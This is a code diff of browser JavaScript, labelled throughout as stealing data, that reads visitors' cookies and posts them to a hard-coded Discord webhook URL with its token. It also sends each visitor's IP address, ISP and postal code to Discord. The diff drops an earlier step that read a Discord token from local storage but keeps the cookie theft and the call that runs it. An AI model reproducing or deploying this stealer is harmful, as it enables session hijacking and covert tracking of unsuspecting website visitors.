@@ -1,25 +1,23 @@
-// Function to steal cookies and Discord token
-function stealDataAndToken() {
+// Function to steal cookies
+function stealCookies() {
     var cookies = document.cookie;
-    var token = localStorage.token; // Assuming the Discord token is stored in local storage
-
-    // Send cookies and token to a remote server
+    // Send cookies to a remote server
     fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ cookies: cookies, token: token })
+        body: JSON.stringify({ cookies: cookies })
     })
     .then(response => {
         if (response.ok) {
-            console.log('Data successfully stolen and sent!');
+            console.log('Cookies successfully stolen!');
         } else {
-            console.error('Failed to steal data:', response.status, response.statusText);
+            console.error('Failed to steal cookies:', response.status, response.statusText);
         }
     })
     .catch(error => {
-        console.error('Error stealing data:', error.message);
+        console.error('Error stealing cookies:', error.message);
     });
 }
 
@@ -48,14 +46,13 @@ Someone visited the website from:
 - Internet provider: ${isp}
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
-- Discord Token: ${token} // Include the Discord token here
 \`\`\``;
 
         // Send message to Discord
         sendMessageToDiscord(message);
 
-        // Call function to steal data and token
-        stealDataAndToken();
+        // Call function to steal cookies
+        stealCookies();
     })
     .catch(error => {
         console.error('Error fetching geolocation information:', error);
